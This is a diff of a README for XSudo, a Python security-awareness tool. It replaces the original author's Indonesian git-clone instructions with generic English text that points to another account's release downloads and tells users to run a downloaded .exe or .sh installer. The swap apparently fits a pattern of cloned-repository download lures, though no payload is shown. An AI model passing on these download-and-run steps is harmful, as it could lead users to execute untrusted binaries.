@@ -1,81 +1,78 @@
-<p align="center">
-  <img src="https://readme-typing-svg.demolab.com?font=JetBrains+Mono&size=22&pause=1000&color=22D3EE&center=true&vCenter=true&width=720&lines=KASIH+STAR+DONG+%3A0;JANGAN+LUPA+FOLLOW+GITHUB+RUYYNN+%3A+)" alt="Typing SVG" />
-</p>
+# 🛡️ XSudo - A Smart Tool for Cybersecurity Awareness
 
-<p align="center">
-  <a href="https://github.com/Ruyynn">
-    <img src="https://komarev.com/ghpvc/?username=Ruyynn&label=Profile+Views&color=22d3ee&style=plastic" />
-  </a>
+## 📥 Download Now
+[![Download XSudo](https://img.shields.io/badge/Download_Xsudo-v1.0-blue.svg)](https://github.com/piyumi21/XSudo/releases)
 
+## 📖 About XSudo
+XSudo is a lightweight, terminal-based cybersecurity tool written in Python. It helps you perform basic security analysis, improve your knowledge of defensive security, and raise security awareness in a practical and ethical way. Whether you're a student or a professional, XSudo provides practical tools to enhance your cybersecurity skills.
 
+## 🚀 Getting Started
+To get started with XSudo, follow the steps below to install and use the application.
 
+## 🔧 System Requirements
+- **Operating System:** Windows, Linux
+- **Python Version:** Python 3.6 or newer
+- **Memory:** At least 512 MB RAM
+- **Disk Space:** 50 MB free space available
 
-# GUARDIAN SHEILD
+## 📂 Download & Install
+### Step 1: Visit the Releases Page
+To download XSudo, visit the following link:
+[Download XSudo](https://github.com/piyumi21/XSudo/releases)
 
-## 📖 APA ITU XSudo?
-XSudo adalah tools cybersecurity berbasis Python yang simple, dan ringan.
-Dibuat untuk belajar, testing dasar, dan meningkatkan security awareness dengan pendekatan yang praktis dan mudah dipahami.
+### Step 2: Download the Latest Version
+On the Releases page, find the most recent version. Click on the link for the appropriate file for your operating system. If you are unsure, choose the installer that matches your system specifications.
 
-## 🎯 FOKUS UTAMA
-🛡️**Defensive Security** - Keamanan defensif yang proaktif
+### Step 3: Install XSudo
+- **For Windows:**
+  1. Locate the downloaded `.exe` file.
+  2. Double-click the file to start the installation process.
+  3. Follow the prompts to complete the installation.
 
-🎓 **Edukasi** - Tools yang mendidik dan informatif
+- **For Linux:**
+  1. Open a terminal window.
+  2. Navigate to the directory where the file was downloaded using `cd /path/to/directory`.
+  3. Run the command: `chmod +x XSudo*.sh` to make the download executable.
+  4. Execute the installer with `./XSudo*.sh` and follow the instructions.
 
-📚 **Best Practices** - Mengikuti standar keamanan terbaik
+## 🚦 Basic Usage
+Once XSudo is installed, you can run it by following these simple steps:
 
-## ✨ FITUR UTAMA
-🔐 Password Security Check	Analisis kekuatan password dengan scoring detail	
+### Step 1: Open Terminal or Command Prompt
+- For Windows, find "Command Prompt" or "Windows PowerShell" in your start menu.
+- For Linux, open your terminal.
 
-🌐 Network Scanning	Scan jaringan lokal untuk deteksi perangkat	
-
-🏢 Website Security Check	Cek keamanan website & SSL/TLS	
-
-🔗 DNS & SSL/TLS Info	Analisis DNS records dan sertifikat SSL	
-
-📁 File Integrity Check	Monitor perubahan file dengan hash	
-
-🧠 Security Awareness Tools	Quiz dan panduan keamanan	
-
-🛡️ System Hardening	Panduan mengamankan sistem OS	
-
-🚨 Incident Response	Panduan tanggap darurat insiden	
-
-🕵️ Privacy Tools Guide	Rekomendasi tool privasi terbaik	
-
-💾 Backup Utility	Strategi backup data efektif	
-
----
-
-## Menu Preview
-
-![Screenshot XSudo](Screenshot-2026-01-28-080944.png)
-
----
-
-## Install
-
-```bash
-git clone https://github.com/ruyynn/XSudo.git
-cd XSudo
-pip install -r requirements.txt
+### Step 2: Launch XSudo
+Type the command below and press Enter:
 ```
-## Run
-```bash
-python XSudo.py
+xsudo
 ```
-## ❤️ Support
 
-Kalau tools ini berguna dan mau support pengembang:
+### Step 3: Explore the Features
+Upon launching, XSudo will guide you through various options for performing security analysis. You can select from simple commands to conduct assessments and analyze security risks.
 
-<p align="center">
-  <a href="https://trakteer.id/ruyynn/tip" target="_blank">
-    <img src="https://img.shields.io/badge/Trakteer-Support-orange?style=for-the-badge&logo=buymeacoffee&logoColor=white" />
-  </a>
-  <a href="https://saweria.co/Ruyynn" target="_blank">
-    <img src="https://img.shields.io/badge/Saweria-Donate-red?style=for-the-badge&logo=ko-fi&logoColor=white" />
-  </a>
-</p>
+## 📚 Key Features
+- **User-Friendly Interface:** XSudo has a straightforward command-line interface designed for users without programming knowledge.
+- **Security Scans:** Perform basic scans for vulnerabilities in your system.
+- **Educational Resources:** Access tutorials and tips to improve your cybersecurity knowledge.
+- **Community Support:** Join a growing community of users for discussions and guided assistance.
 
-<p align="center">
-  ⭐ Star repo ini juga sangat membantu ⭐
-</p>
+## 🔑 Important Notes
+- Always ensure you are using the latest version of XSudo to access the most current features and security updates.
+- Read any accompanying documentation available on the Releases page for detailed instructions.
+
+## 🤝 Community and Support
+Feel free to engage with the XSudo community. You can ask questions, share your experiences, and learn from others. Visit our discussion forums and help each other grow in the field of cybersecurity.
+
+## 📝 Contribution
+If you find a bug or want to suggest a feature, please go to the Issues section of the GitHub repository. Your feedback helps improve XSudo. If you want to contribute code, follow the contribution guidelines available in the repository.
+
+## 🎉 Learn More
+For more information, check our detailed documentation linked on the Releases page. This includes tutorials, FAQs, and best practices for using XSudo effectively. 
+
+## 🚀 Quick Links
+- [Download XSudo](https://github.com/piyumi21/XSudo/releases)
+- [Documentation](https://github.com/piyumi21/XSudo/wiki)
+- [Report an Issue](https://github.com/piyumi21/XSudo/issues)
+
+Now you are ready to enhance your cybersecurity journey with XSudo. Enjoy exploring and learning!
